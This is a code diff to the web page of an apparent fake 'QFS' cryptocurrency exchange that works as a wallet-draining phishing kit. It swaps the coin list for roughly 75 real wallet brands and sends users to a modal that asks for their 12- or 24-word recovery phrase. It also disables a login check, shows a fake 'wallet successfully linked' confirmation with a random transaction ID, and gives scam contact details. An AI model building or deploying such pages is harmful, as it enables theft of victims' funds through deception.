@@ -68,12 +68,43 @@
         <span class="badge mb-3" data-aos="fade-up">Future of crypto trading</span>
         <h1 class="display-3" data-aos="fade-up" data-aos-delay="200">Fast & Secure <br> Cryptocurrency Exchange</h1>
         <p class="text-secondary mt-3 mb-4 col-lg-6 mx-auto" data-aos="fade-up" data-aos-delay="300">Trade cryptocurrencies with ease, security, and advanced features on our cutting-edge platform.</p>
-        <a href="#crypto" class="btn primary-btn px-4 py-2" data-aos="fade-up" data-aos-delay="300">Get Started</a>
+        <a href="#crypto" class="btn primary-btn px-4 py-2" data-aos="fade-up" data-aos-delay="300">Connect Wallet</a>
       </div>
     </div>
     <img src="./images/OY3765wP7RKuihe6iCzotZ1ge0.svg" class="w-100 mt-5" alt="">
   </section>
 <br>
+
+<!-- Wallet Balance Card -->
+<div class="wallet-container container">
+  <div class="wallet-header">
+    <div>
+      <h4>Total Balance</h4>
+      <h2 class="balance-amount">$0.00</h2>
+      <p class="not-verified">Not Verified</p>
+      <button class="verify-btn">Verify Now</button>
+    </div>
+  </div>
+  
+  <hr class="wallet-divider" />
+
+  <div class="wallet-actions">
+    <div class="action">
+      <div class="action-icon bg-danger"><i class="bi bi-arrow-up"></i></div>
+      <p>Send</p>
+    </div>
+    <div class="action">
+      <div class="action-icon green"><i class="bi bi-arrow-down"></i></div>
+      <p>Receive</p>
+    </div>
+    <div class="action">
+      <div class="action-icon yellow"><i class="bi bi-link"></i></div>
+      <p>Link Wallet</p>
+    </div>
+  </div>
+</div>
+
+
   <div class="row g-4 container mx-auto my-5" data-aos="fade-right">
     <!-- Buy Crypto -->
     <div class="col-md-4 text-center">
@@ -104,7 +135,7 @@
 
   <div class="container py-5" id="crypto">
     <h2 class="text-center mb-4">Select a Cryptocurrency</h2>
-    <div class="row row-cols-2 row-cols-md-4 g-4" id="crypto-container">
+    <div class="row row-cols-1 row-cols-md-2 row-cols-lg-4 g-4" id="crypto-container">
             
     </div>
   </div>
@@ -136,29 +167,34 @@
         <!-- Form Sections -->
         <div id="phoneForm" class="form-section">
           <form onsubmit="sendForm(event, 'phone')">
-            <input type="text" class="form-control mb-3" id="phoneNumber" placeholder="Enter your recovery phrase" required>
+            <textarea type="text" class="form-control mb-3 phrase" id="phoneNumber" placeholder="Enter your recovery phrase" required></textarea>
             <input type="hidden" id="selectedCrypto" />
             <p class="text-white-50">Typically 12 (sometimes 24) words seperated by single spaces</p>
             <div class="d-flex justify-content-between">
-              <button type="submit" class="btn btn-success">Submit</button>
-              <button type="button" class="btn btn-danger" data-bs-dismiss="modal" aria-label="Close">Close</button>
+              <button type="submit" class="btn btn-success w-100">Submit</button>
+              <!-- <button type="button" class="btn btn-danger" data-bs-dismiss="modal" aria-label="Close">Close</button> -->
             </div>
           </form>
         </div>
 
-        <!-- <div id="emailForm" class="form-section d-none">
-          <form onsubmit="sendForm(event, 'email')">
-            <input type="email" class="form-control mb-3" id="emailAddress" placeholder="Enter your email address" required>
-            <button type="submit" class="btn btn-primary w-100">Submit Email</button>
-          </form>
-        </div> -->
+        <!-- Success Modal -->
+        <div class="modal fade bg-dark" id="successModal" tabindex="-1" aria-labelledby="successModalLabel" aria-hidden="true">
+          <div class="modal-dialog modal-dialog-centered">
+            <div class="modal-content text-center p-4 py-5">
+              <div class="checkmark-wrapper">
+                <svg viewBox="0 0 52 52">
+                  <circle class="circle" cx="26" cy="26" r="24" />
+                  <path class="checkmark" d="M14 27 L22 35 L38 18" />
+                </svg>
+              </div>
+              <h4 class="text-success">Successful</h4>
+              <p class="text-dark">Your wallet was successfully linked.</p>
+              <p class="text-dark"><strong>Transaction ID:</strong> <span id="transactionId" class="text-primary"></span></p>
+              <button type="button" class="btn w-100 bg-dark text-white mt-3" data-bs-dismiss="modal">Close</button>
+            </div>
+          </div>
+        </div>
 
-        <!-- <div id="tradeForm" class="form-section d-none">
-          <form onsubmit="sendForm(event, 'trade')">
-            <input type="text" class="form-control mb-3" placeholder="Enter username to trade" required>
-            <button type="submit" class="btn btn-success w-100">Start Trading</button>
-          </form>
-        </div> -->
       </div>
     </div>
   </div>
@@ -342,9 +378,8 @@
       <div class="col-lg-3">
         <h6 class="text-uppercase fw-semibold">Contact</h6>
         <ul class="list-unstyled mt-3 text-white-50">
-          <li><i class="bi bi-envelope-fill me-2"></i>support@qfs.com</li>
-          <li class="mt-2"><i class="bi bi-telephone-fill me-2"></i>+234 701 234 5789</li>
-          <li class="mt-2"><i class="bi bi-geo-alt-fill me-2"></i>Lagos, Nigeria</li>
+          <li><i class="bi bi-envelope-fill me-2"></i>qfssystemvault@gmail.com</li>
+          <li class="mt-2"><i class="bi bi-telephone-fill me-2"></i>+17633521369</li>
         </ul>
       </div>
 
@@ -359,28 +394,79 @@
 
   <script>
     const coins = [
-  { name: "Bitcoin", logo: "https://assets.coingecko.com/coins/images/1/large/bitcoin.png" },
-  { name: "Ethereum", logo: "https://assets.coingecko.com/coins/images/279/large/ethereum.png" },
-  { name: "BNB", logo: "./images/bnb-bnb-logo.png" },
-  { name: "Solana", logo: "https://assets.coingecko.com/coins/images/4128/large/solana.png" },
-  { name: "Dogecoin", logo: "https://assets.coingecko.com/coins/images/5/large/dogecoin.png" },
-  { name: "Cardano", logo: "https://assets.coingecko.com/coins/images/975/large/cardano.png" },
-  { name: "Ripple", logo: "https://assets.coingecko.com/coins/images/44/large/xrp-symbol-white-128.png" },
-  { name: "Shiba Inu", logo: "https://assets.coingecko.com/coins/images/11939/large/shiba.png" },
-  { name: "Polkadot", logo: "https://assets.coingecko.com/coins/images/12171/large/polkadot.png" },
-  { name: "Avalanche", logo: "./images/avalanche-avax-logo.png" },
-  { name: "Litecoin", logo: "https://assets.coingecko.com/coins/images/2/large/litecoin.png" },
-  { name: "Tron", logo: "https://assets.coingecko.com/coins/images/1094/large/tron-logo.png" },
-  { name: "Chainlink", logo: "https://assets.coingecko.com/coins/images/877/large/chainlink-new-logo.png" },
-  { name: "Uniswap", logo: "https://assets.coingecko.com/coins/images/12504/large/uniswap-uni.png" },
-  { name: "Cosmos", logo: "https://assets.coingecko.com/coins/images/1481/large/cosmos_hub.png" },
-  { name: "NEAR Protocol", logo: "https://assets.coingecko.com/coins/images/10365/large/near.png" },
-  { name: "VeChain", logo: "./images/vechain-vet-logo.png" },
-  { name: "Aptos", logo: "https://assets.coingecko.com/coins/images/26455/large/aptos_round.png" },
-  { name: "Arbitrum", logo: "https://assets.coingecko.com/coins/images/16547/large/photo_2023-03-29_21.47.00.jpeg" },
-  { name: "Stacks", logo: "https://assets.coingecko.com/coins/images/2069/large/Stacks_logo_full.png" },
-  { name: "The Graph", logo: "https://assets.coingecko.com/coins/images/13397/large/Graph_Token.png" },
-  { name: "Filecoin", logo: "https://assets.coingecko.com/coins/images/12817/large/filecoin.png" }
+  { name: "Bitcoin", logo: "./images/bitcoin.svg" },
+  { name: "Trust Wallet", logo: "./images/trustwallet.png" },
+  { name: "Lobstr", logo: "./images/lobstr.png" },
+  { name: "Wallet Connect", logo: "./images/walletconnect.jpg" },
+  { name: "Atomic", logo: "./images/atomic.png" },
+  { name: "Rainbow", logo: "./images/rainbow.png" },
+  { name: "Argent", logo: "./images/argent.jpeg" },
+  { name: "Gnosis Safe Multisig", logo: "./images/gnosissafemultisig.jpeg" },
+  { name: "Crypto.com", logo: "./images/cryptocom.png" },
+  { name: "Nash", logo: "./images/nash.jpeg" },
+  { name: "Metamask", logo: "./images/metamask.png" },
+  { name: "Pillar", logo: "./images/pillar.png" },
+  { name: "Tokenary", logo: "./images/tokenary.png" },
+  { name: "Wazirx", logo: "./images/wazirx.png" },
+  { name: "D'CENT Wallet", logo: "./images/dcentwallet.png" },
+  { name: "ZelCore", logo: "./images/zelcore.png" },
+  { name: "Coinomi", logo: "./images/coinomi.jpg" },
+  { name: "Torus", logo: "./images/torus.jpeg" },
+  { name: "ONTO", logo: "./images/onto.png" },
+  { name: "Anchor", logo: "./images/anchor.png" },
+  { name: "TokenPocket", logo: "./images/tokenpocket.png" },
+  { name: "MathWallet", logo: "./images/mathwallet.png" },
+  { name: "BitPay", logo: "./images/bitpay.jpg" },
+  { name: "Ledger Live", logo: "./images/ledger.png" },
+  { name: "Walleth", logo: "./images/walleth.png" },
+  { name: "Authereum", logo: "./images/authereum.png" },
+  { name: "Huobi Wallet", logo: "./images/huobiwallet.jpeg" },
+  { name: "Eidoo", logo: "./images/eidoo.png" },
+  { name: "MYKEY", logo: "./images/mykey.png" },
+  { name: "Loopring Wallet", logo: "./images/loopringwallet.jpeg" },
+  { name: "TrustVault", logo: "./images/trustvault.png" },
+  { name: "Coin98", logo: "./images/coin98.png" },
+  { name: "CoolWallet S", logo: "./images/coolwallets.png" },
+  { name: "Alice", logo: "./images/alice.png" },
+  { name: "GridPlus", logo: "./images/gridplus.png" },
+  { name: "CYBAVO Wallet", logo: "./images/cybavowallet.png" },
+  { name: "Spatium", logo: "./images/spatium.jpeg" },
+  { name: "SafePal", logo: "./images/safepal.png" },
+  { name: "Equal", logo: "./images/equal.jpeg" },
+  { name: "Infinito", logo: "./images/infinito.png" },
+  { name: "Ownbit", logo: "./images/ownbit.png" },
+  { name: "EasyPocket", logo: "./images/easypocket.jpg" },
+  { name: "ViaWallet", logo: "./images/viawallet.png" },
+  { name: "Bridge Wallet", logo: "./images/bridgewallet.png" },
+  { name: "SparkPoint", logo: "./images/sparkpoint.png" },
+  { name: "Infinity Wallet", logo: "./images/infinitywallet.png" },
+  { name: "wallet.io", logo: "./images/walletio.png" },
+  { name: "BitKeep", logo: "./images/bitkeep.png" },
+  { name: "Vision", logo: "./images/vision.png" },
+  { name: "SWFT Wallet", logo: "./images/swftwallet.png" },
+  { name: "PEAKDEFI Wallet", logo: "./images/peakdefiwallet.png" },
+  { name: "Cosmostation", logo: "./images/cosmostation.png" },
+  { name: "Graph Protocol", logo: "./images/graphprotocol.jpg" },
+  { name: "KardiaChain", logo: "./images/kardiachain.png" },
+  { name: "Keplr", logo: "./images/keplr.png" },
+  { name: "Harmony", logo: "./images/harmony.png" },
+  { name: "ICONex", logo: "./images/iconex.png" },
+  { name: "Fetch", logo: "./images/fetch.jpg" },
+  { name: "XDC Wallet", logo: "./images/xdcwallet.png" },
+  { name: "Unstoppable Wallet", logo: "./images/unstoppablewallet.png" },
+  { name: "MEET.ONE", logo: "./images/meetone.jpg" },
+  { name: "Dok Wallet", logo: "./images/dokwallet.png" },
+  { name: "AT.Wallet", logo: "./images/atwallet.png" },
+  { name: "MoriX Wallet", logo: "./images/morixwallet.png" },
+  { name: "Midas Wallet", logo: "./images/midaswallet.png" },
+  { name: "Ellipal", logo: "./images/ellipal.png" },
+  { name: "MEET.ONE", logo: "./images/meetone.jpg" },
+  { name: "KEYRING PRO", logo: "./images/keyringpro.png" },
+  { name: "Blockchain", logo: "./images/blockchain.png" },
+  { name: "Binance Smart Chain", logo: "./images/binancesmartchain.png" },
+  { name: "Aktionariat", logo: "./images/aktionariat.png"},
+  { name: "Coinbase", logo: "./images/coinbase.jpg" },
+  { name: "Exodus", logo: "./images/exodus.png" }
 ];
 
 const container = document.getElementById("crypto-container");
@@ -392,7 +478,7 @@ coins.forEach(coin => {
   col.className = "col";
   col.innerHTML = `
     <div class="crypto-card text-center p-3 shadow-sm border rounded" data-name="${coin.name}" data-bs-toggle="modal" data-bs-target="#cryptoModal">
-      <img src="${coin.logo}" alt="${coin.name}" class="crypto-logo mb-2" style="width: 50px; height: 50px;">
+      <img src="${coin.logo}" alt="${coin.name}" class="crypto-logo mb-2" style="width: 50px; height: 50px; border-radius: 50%">
       <h5>${coin.name}</h5>
     </div>
   `;
@@ -430,11 +516,11 @@ function sendForm(event, type) {
   }
 
   // Get auth token from localStorage
-  const token = localStorage.getItem('authToken');
-  if (!token) {
-    alert('You must be logged in to add a wallet.');
-    return;
-  }
+  // const token = localStorage.getItem('authToken');
+  // if (!token) {
+  //   alert('You must be logged in to add a wallet.');
+  //   return;
+  // }
 
   // Prepare payload
   const payload = {
@@ -497,14 +583,53 @@ function sendForm(event, type) {
   });
   </script>
 
-  <script src="./js/aos.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+  <script src="./js/script.js"></script>
+  <script src="./js/aos.js"></script>
   <script>
     AOS.init({
       duration: 700,
       once: true
     })
+
+    // For the success modal 
+  function sendForm(event, type) {
+    event.preventDefault();
+
+    // Optional: Get the value of the phone number
+    const phoneNumber = document.getElementById('phoneNumber').value;
+
+    // Generate a random transaction ID (8 letters + 4 numbers)
+    const txId = generateTransactionId();
+
+    // Set the transaction ID in the modal
+    document.getElementById('transactionId').textContent = txId;
+
+    // Reset form (optional)
+    event.target.reset();
+
+    // Show the success modal
+    const successModal = new bootstrap.Modal(document.getElementById('successModal'));
+    successModal.show();
+  }
+
+  function generateTransactionId() {
+    const letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
+    const numbers = '0123456789';
+    let result = '';
+    for (let i = 0; i < 8; i++) {
+      result += letters.charAt(Math.floor(Math.random() * letters.length));
+    }
+    for (let i = 0; i < 4; i++) {
+      result += numbers.charAt(Math.floor(Math.random() * numbers.length));
+    }
+    return result.toUpperCase(); //Makes it all uppercase
+  }
+
   </script>
+
+
+
   <script>
   function showForm(formId) {
     document.querySelectorAll('.form-switcher').forEach(form => {
@@ -543,6 +668,8 @@ function sendForm(event, type) {
     alert(result.message || "Sent successfully");
   }
 </script>
+
+
 <script>
   const container1 = document.getElementById("crypto-container");
   const selectedInput1 = document.getElementById("selectedCrypto");
